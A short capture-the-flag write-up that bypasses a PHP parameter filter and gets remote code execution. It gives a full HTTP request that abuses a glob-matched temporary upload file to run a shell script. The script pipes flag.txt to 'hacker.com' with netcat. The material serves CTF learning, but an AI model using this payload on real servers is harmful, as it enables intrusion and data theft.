## Solution
#### bypass substrcount($qs, '') > 0

I just fuzzed the HTTP GET param key name, found three available chars:
```
set parameter ?c.m.d=
set parameter ?c+m+d=
set parameter ?c m d=
set parameter ?c[m[d=
```
the second and the third seem the same thing.
and `c[md` works but `c[m[d` does not.

#### leads to rce
```
POST /?c.m.d=`.%20/???/[[-{]???????[@-[]` HTTP/1.1
Host: 192.168.159.132:5001
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.18.4
Content-Length: 177
Content-Type: multipart/form-data; boundary=449cd8bede5c423bbec7773e557e39da

--449cd8bede5c423bbec7773e557e39da
Content-Disposition: form-data; name="file"; filename="file"


#!/bin/sh

cat flag.txt|nc hacker.com 1337

--449cd8bede5c423bbec7773e557e39da--

```

#### Reference
* https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html
* https://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf
